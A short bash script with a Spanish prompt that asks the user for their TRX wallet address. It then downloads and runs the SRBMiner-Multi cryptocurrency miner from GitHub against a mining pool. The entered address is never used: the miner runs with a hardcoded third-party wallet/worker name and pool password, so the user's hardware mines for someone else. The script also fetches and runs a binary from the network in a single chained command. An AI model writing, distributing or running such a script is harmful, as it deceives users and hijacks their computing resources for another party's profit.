#!/bin/bash

read -p "Ingresa tu dirección de billetera TRX: " wallet_address && wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.5/SRBMiner-Multi-2-3-5-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-3-5-Linux.tar.xz && cd SRBMiner-Multi-2-3-5 && ./SRBMiner-MULTI --algorithm progpow_epic --pool us.epicmine.io:3333 --wallet Zaky_fuadi90.asad1 --password Kopi_manis90dm=pool --disable-cpu
